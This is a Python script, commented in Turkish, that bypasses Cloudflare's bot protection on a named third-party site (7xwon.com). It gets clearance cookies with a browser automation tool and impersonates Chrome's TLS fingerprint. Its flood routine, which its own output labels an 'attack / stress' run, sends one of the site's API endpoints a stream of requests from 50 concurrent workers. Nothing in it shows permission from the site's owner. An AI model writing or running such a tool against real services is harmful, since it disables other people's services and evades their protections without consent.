"""
7xwon Cloudflare Bypass & Main-Events Stres Test Runner
curl_cffi (Chrome TLS impersonation) + Cloudflare Clearance Bypass
"""
import asyncio
import time
import os
import sys
from curl_cffi import requests
import nodriver as uc

# Endpoint & Ayarlar
TARGET_URL = "https://7xwon.com/api/main-events"
BEARER_TOKEN = os.environ.get("BEARER_TOKEN", "Bearer unlogged")

# Eger disaridan saf token verilirse basi "Bearer " degilse tamamla
if not BEARER_TOKEN.startswith("Bearer "):
    BEARER_TOKEN = f"Bearer {BEARER_TOKEN}"

class WonRunner:
    def __init__(self, target_url: str = TARGET_URL, token: str = BEARER_TOKEN):
        self.target_url = target_url
        self.token = token
        self.cookies = {}
        self.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

    async def init_cf(self):
        """Cloudflare clearance cerezini otomatik ceker."""
        print("[*] Cloudflare clearance cozucu baslatiliyor (nodriver)...")
        try:
            b = await uc.start(headless=False)
            p = await b.get("https://7xwon.com")
            await asyncio.sleep(4)
            cks = await b.cookies.get_all()
            self.cookies = {c.name: c.value for c in cks}
            ua = await p.evaluate("navigator.userAgent")
            if ua:
                self.user_agent = ua
            b.stop()
            print(f"[+] CF Basariyla Gecildi! cf_clearance: {self.cookies.get('cf_clearance', '')[:25]}...")
            return True
        except Exception as e:
            print(f"[-] CF Cozme Hatasi: {e}")
            return False

    def get_headers(self):
        return {
            "User-Agent": self.user_agent,
            "Content-Type": "application/json",
            "Authorization": self.token,
            "Origin": "https://7xwon.com",
            "Referer": "https://7xwon.com/"
        }

    def test_single_request(self):
        """Tekil test istegi atar ve yaniti gosterir."""
        print(f"[*] Test istegi gonderiliyor -> {self.target_url}")
        print(f"[*] Authorization: {self.token[:20]}...")
        headers = self.get_headers()
        
        t0 = time.perf_counter()
        r = requests.post(
            self.target_url,
            cookies=self.cookies,
            headers=headers,
            json={"type": 0, "odds": False, "code": False, "s": 1, "t": False, "_ts": int(time.time()*1000)},
            impersonate="chrome120",
            timeout=10
        )
        elapsed = round((time.perf_counter() - t0) * 1000, 1)
        print(f"[+] Durum Kodu: {r.status_code} | Sure: {elapsed} ms | Boyut: {len(r.text)} byte")
        print(f"[+] Yanit Ozeti: {r.text[:250]}...")
        return r.status_code == 200

    async def start_flood(self, concurrency: int = 50, duration_sec: int = 20):
        """Coklu eszamanli istek dongusu."""
        print(f"\n[>] SALDIRI / STRES BASLIYOR: {concurrency} eszamanli worker, {duration_sec} saniye")
        headers = self.get_headers()
        stop_event = asyncio.Event()
        stats = {"ok": 0, "err": 0, "total": 0}

        async def worker():
            while not stop_event.is_set():
                try:
                    payload = {"type": 0, "odds": False, "code": False, "s": 1, "t": False, "_ts": int(time.time()*1000)}
                    res = await asyncio.to_thread(
                        requests.post,
                        self.target_url,
                        cookies=self.cookies,
                        headers=headers,
                        json=payload,
                        impersonate="chrome120",
                        timeout=5
                    )
                    stats["total"] += 1
                    if res.status_code == 200:
                        stats["ok"] += 1
                    else:
                        stats["err"] += 1
                except Exception:
                    stats["total"] += 1
                    stats["err"] += 1
                await asyncio.sleep(0.01)

        tasks = [asyncio.create_task(worker()) for _ in range(concurrency)]

        # Raporlayici
        t0 = time.time()
        while time.time() - t0 < duration_sec:
            await asyncio.sleep(2)
            passed = time.time() - t0
            rps = stats["total"] / max(1, passed)
            print(f"[{passed:.0f}s] Toplam: {stats['total']} | 200 OK: {stats['ok']} | Hata: {stats['err']} | Hiz: {rps:.1f} req/s")

        stop_event.set()
        await asyncio.gather(*tasks, return_exceptions=True)
        print(f"\n[+] TAMAMLANDI! Toplam Istek: {stats['total']}, Basarili: {stats['ok']}, Hata: {stats['err']}")

async def main():
    won = WonRunner()
    ok = await won.init_cf()
    if not ok:
        print("CF gecilemedi!")
        return
    
    # 1 kez test et
    won.test_single_request()
    print("\n[OK] Sistem hazir ve beklemede! Tokeni guncelleyip veya direkt flood baslatabilirsin.")

if __name__ == "__main__":
    asyncio.run(main())
